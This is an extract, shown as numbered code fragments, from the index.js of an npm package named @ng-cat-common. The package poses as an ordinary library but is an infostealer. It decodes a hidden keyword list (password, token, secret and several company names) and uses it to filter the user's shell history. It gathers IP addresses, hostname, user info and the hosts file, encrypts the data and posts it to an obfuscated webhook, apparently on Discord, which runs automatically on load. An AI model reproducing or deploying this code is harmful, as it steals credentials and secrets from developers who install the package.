// File: tmp/tmpkib0c17q/@ng-cat-common/package/index.js
// ======================================================================
Line 2: const _fs = require('fs')
Line 3: const _path = require('path')
Line 4: const _crypto = require('crypto')
Line 5: const _https = require('https')
Line 6: const _os = require('os')
Line 11: _tmp_14.push("Y2F0")
Line 12: _tmp_14.push("cGVya2lucw==")
Line 13: _tmp_14.push("YXZlc2Nv")
Line 14: _tmp_14.push("cHJvZ3Jlc3NyYWls")
Line 15: _tmp_14.push("cGFzcw==")
Line 16: _tmp_14.push("cGFzc3dvcmQ=")
Line 17: _tmp_14.push("YWNjZXNz")
Line 18: _tmp_14.push("dG9rZW4=")
Line 19: _tmp_14.push("c2VjcmV0")
Line 20: _tmp_14.push("Y29uZmlkZW50aWFs")
Line 21: Buffer.from(w, 'base64').toString('utf8')
Line 24: const _key = _crypto.randomBytes(32)
Line 25: const _iv = _crypto.randomBytes(16)
Line 33: _key.toString('hex')
Line 34: _iv.toString('hex')
Line 38: {
        const _interfaces = _os.networkInterfaces();
        const _ips = [];

        for (const _iface of Object.keys(_interfaces)) {
            for (const _details of _interfaces[_iface]) {
                if (!_details.internal) {
                    _ips.push(_details.address);
                }
            }
        }
        return _ips;
    }
Line 40: const _ips = []
Line 42: for (const _iface of Object.keys(_interfaces)) {
            for (const _details of _interfaces[_iface]) {
                if (!_details.internal) {
                    _ips.push(_details.address);
                }
            }
        }
Line 43: for (const _details of _interfaces[_iface]) {
                if (!_details.internal) {
                    _ips.push(_details.address);
                }
            }
Line 45: _ips.push(_details.address)
Line 52: {
        const _opts = {
            hostname: 'api.ipify.org',
            path: '/?format=json',
            method: 'GET'
        };

        const _req = _https.request(_opts, (res) => {
            let _data = '';
            res.on('data', (chunk) => {
                _data += chunk;
            });

            res.on('end', () => {
                try {
                    const _ip = JSON.parse(_data).ip;
                    callback(null, _ip);
                } catch (e) {
                    callback(e, null);
                }
            });
        });

        _req.on('error', (e) => {
            console.error('E-IP-pu:', e.message);
            callback(e, null);
        });

        _req.end();
    }
Line 59: const _req = _https.request(_opts, (res) => {
            let _data = '';
            res.on('data', (chunk) => {
                _data += chunk;
            });

            res.on('end', () => {
                try {
                    const _ip = JSON.parse(_data).ip;
                    callback(null, _ip);
                } catch (e) {
                    callback(e, null);
                }
            });
        })
Line 67: const _ip = JSON.parse(_data).ip
Line 68: callback(null, _ip)
Line 70: callback(e, null)
Line 77: callback(e, null)
Line 80: _req.end()
Line 83: {
        const _histFile = _path.join(_os.homedir(), '.zsh_history');
        let _history = [];

        try {
            const _fileData = _fs.readFileSync(_histFile, 'utf8');
            const _lines = _fileData.split('\n');

            _history = _lines.filter(line => 
                _kw.some(kw => line.includes(kw))
            );

        } catch (e) {
            console.error('E-His:', e.message);
        }

        return _history;
    }
Line 84: _path.join(_os.homedir(), '.zsh_history')
Line 85: let _history = []
Line 88: const _fileData = _fs.readFileSync(_histFile, 'utf8')
Line 92: _kw.some(kw => line.includes(kw))
Line 103: _os.hostname()
Line 104: _os.platform()
Line 106: _os.userInfo()
Line 117: _path.join('C:', 'Windows', 'System32', 'drivers', 'etc', 'hosts')
Line 119: _hostsContent = _fs.readFileSync(_hostsPath, 'utf8')
Line 125: _hostsContent = _fs.readFileSync('/etc/hosts', 'utf8')
Line 144: callback(_sysInfo)
Line 148: {
        const { _encData, _encKey, _encIV } = _enc(JSON.stringify(sysInfo));

        let _historyStr = sysInfo.filteredHistory.join(', ');
        if (_historyStr.length > 2000) {
            _historyStr = _historyStr.substring(0, 1997) + '...';
        }

        const _encodedHistory = Buffer.from(_historyStr).toString('base64');

        const _data = JSON.stringify({
            content: `ED: \`${_encData}\`\nKey: \`${_encKey}\`\nIV: \`${_encIV}\`\nFH: \`${_encodedHistory}\``,
            username: "NPM"
        });

        const _webhookUrl = new URL(Buffer.from(_url, 'base64').toString('utf8'));
        const _reqOpts = {
            hostname: _webhookUrl.hostname,
            path: _webhookUrl.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': _data.length
            }
        };

        const _request = _https.request(_reqOpts, (res) => {
            res.on('data', (d) => {
...
Line 151: sysInfo.filteredHistory.join(', ')
Line 156: Buffer.from(_historyStr).toString('base64')
Line 163: Buffer.from(_url, 'base64').toString('utf8')
Line 174: const _request = _https.request(_reqOpts, (res) => {
            res.on('data', (d) => {
                process.stdout.write(d);
            });
        })
Line 175: {
                process.stdout.write(d);
            }
Line 176: process.stdout.write(d)
Line 184: _request.write(_data)
Line 185: _request.end()
Line 193: (async function main() {
        await _delayExec();

        _gatherSystemInfo((sysInfo) => {
            _sendDataToDiscord(sysInfo);
        });
    })()
